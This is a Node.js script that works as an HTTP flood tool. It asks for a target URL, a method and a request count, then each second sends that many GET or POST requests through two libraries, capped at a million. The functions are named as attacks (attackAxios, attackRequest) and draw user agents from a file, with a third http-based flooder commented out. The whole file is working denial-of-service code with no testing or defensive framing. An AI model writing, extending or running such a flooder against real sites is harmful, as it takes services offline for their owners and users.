const axios = require("axios");
const http = require("http");
const request = require("request");
const fs = require("fs-extra");
const readline = require("readline");

const readUA = () => {
  try {
    const data = fs.readFileSync("user_agents.txt", "utf8").replace(/\r/g, "").split("\n");
    return data.map((line) => line.trim());
  } catch (error) {
    console.error(`Failed to read user agent list: ${error}`);
    return [];
  }
};

const userAgents = readUA();

const askQuestion = (question) => {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
};

(async () => {
  const url = await askQuestion("Enter the target URL: ");
  const methodInput = await askQuestion("Enter the request method (GET/POST): ");
  const limitInput = await askQuestion("Enter the number of requests to send for each module: ");

  const method = methodInput.toUpperCase();
  const limit = parseInt(limitInput, 10);

  if (!url || !["GET", "POST"].includes(method) || isNaN(limit)) {
    console.error("Invalid input. Please try again.");
    return;
  }

  const getRandomUserAgent = () => {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  };

  const headers = { "User-Agent": getRandomUserAgent() };

  let count = 0;

  const attackAxios = () => {
    axios({ method, url, headers })
      .then(() => {
        count++;
        if (count % 100 === 0) {
          console.log(`Requests sent via axios: ${count}`);
        }
      })
      .catch((e) => {
        console.error(`Error attacking via axios: ${e.message}`);
      });
  };

  const attackRequest = () => {
    request({ method, url, headers }, (error) => {
      if (error) {
        console.error(`Error attacking via request: ${error.message}`);
      } else {
        count++;
        if (count % 100 === 0) {
          console.log(`Requests sent via request: ${count}`);
        }
      }
    });
  };

  /* const attackHttp = () => {
    const options = new URL(url);
    options.method = method;
    options.headers = headers;

    const req = http.request(options, (res) => {
      res.on("data", () => {
        count++;
        if (count % 100 === 0) {
          console.log(`Requests sent via http: ${count}`);
        }
      });
    });

    req.on("error", (e) => {
      console.error(`Error attacking via http: ${e.message}`);
    });

    req.end();
  };*/

  const interval = setInterval(() => {
    for (let i = 0; i < limit; i++) {
      attackAxios();
      attackRequest();
      // attackHttp();
    }
    if (count >= 1000000) {
      clearInterval(interval);
      console.log("Reached maximum request limit.");
    }
  }, 1000);
})();